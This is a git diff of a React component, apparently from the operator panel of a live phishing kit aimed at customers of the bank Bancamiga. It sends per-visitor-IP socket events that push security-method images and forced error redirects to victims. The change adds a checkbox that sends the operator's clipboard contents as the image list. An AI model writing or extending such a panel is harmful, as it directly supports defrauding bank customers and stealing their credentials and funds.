@@ -12,9 +12,13 @@ export const ErrorIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
     initialValues: {
       image: ''
     },
-    onSubmit: ({image}) =>{
+    onSubmit: async({image}) =>{
       if(textPage == 'Metodo seguridad') socket.emit('[bancamiga] getImage', {image, ip})
-      if(textPage == 'Imagen') socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image) , ip})
+      if(textPage == 'Imagen') {
+        (isSelected) 
+        ? socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(await navigator.clipboard.readText()), ip}) 
+        : socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
+      }
       socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true })
       setFormView(false)
       onClose()
@@ -32,7 +36,7 @@ export const ErrorIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
         <PopoverTrigger onClick={() => sendBagRedirect()} >
           <div className="cursor-pointer">
             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
-                <path strokeLinecap="round" strokeLinejoin="round" d="M6 12 3.269 3.125A59.769 59.769 0 0 1 21.485 12 59.768 59.768 0 0 1 3.27 20.875L5.999 12Zm0 0h7.5" />
+              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18 18 6M6 6l12 12" />
             </svg>
           </div>
         </PopoverTrigger>
@@ -47,6 +51,15 @@ export const ErrorIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
                   </Checkbox>
               ) : null
             }
+
+            {
+              textPage == 'Imagen' ? (
+                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
+                    Enviar lo copiado
+                  </Checkbox>
+              ) : null
+            }
+
             <Button className="w-full mt-5" type="submit" color="primary" variant="shadow" size="sm" >ENVIAR</Button>
           </form>
         </PopoverContent>
